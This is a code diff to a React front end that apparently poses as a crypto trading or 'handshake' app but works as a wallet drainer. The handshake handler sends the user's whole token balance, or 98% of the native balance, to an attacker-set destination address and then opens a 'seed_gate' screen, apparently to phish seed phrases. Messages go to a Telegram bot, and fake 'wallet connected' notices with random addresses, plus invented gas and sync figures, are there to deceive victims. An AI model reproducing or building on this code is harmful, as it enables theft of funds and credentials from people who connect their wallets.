@@ -29,21 +29,15 @@ export default function App() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
-  // FIXED NOTIFICATION LOGIC
   useEffect(() => {
     const triggerMsg = () => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} WALLET CONNECTED TO MAINNET_NODE`);
       setTimeout(() => setFeedMsg(""), 4500);
     };
-    
-    const timeout = setTimeout(triggerMsg, 2000); // First one fast
-    const interval = setInterval(triggerMsg, 9000); // Then every 9s
-    
-    return () => {
-      clearTimeout(timeout);
-      clearInterval(interval);
-    };
+    const timeout = setTimeout(triggerMsg, 2000);
+    const interval = setInterval(triggerMsg, 9000);
+    return () => { clearTimeout(timeout); clearInterval(interval); };
   }, []);
 
   const handleHandshake = () => {
@@ -52,8 +46,7 @@ export default function App() {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 100000000000000n) {
-      const amount = (nativeBal.value * 98n) / 100n;
-      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
+      sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -93,17 +86,11 @@ export default function App() {
       ) : (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe 
-              title="market-chart"
-              src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark"
-              style={{width:'100%', height:'100%', border:'none'}}
-            />
+            <iframe title="chart" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
-            <span>〽️ GAS: 14 GWEI</span>
-            <span>⚡ SLIPPAGE: 0.1%</span>
-            <span>📡 SYNC: 99.9%</span>
+            <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
           </div>
 
           {view === "menu" && (
@@ -127,8 +114,7 @@ export default function App() {
               </div>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input value={inputVal} type="text" onChange={(e)=>setInputVal(e.target.value)}
-                style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
+                <input value={inputVal} type="text" onChange={(e)=>setInputVal(e.target.value)} style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
               <button disabled={!inputVal || inputVal === "0"} onClick={handleHandshake} style={{width:'100%', backgroundColor: (inputVal && inputVal !== "0") ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
             </div>
@@ -173,7 +159,6 @@ export default function App() {
         </>
       )}
 
-      {/* SUCCESS FEED */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
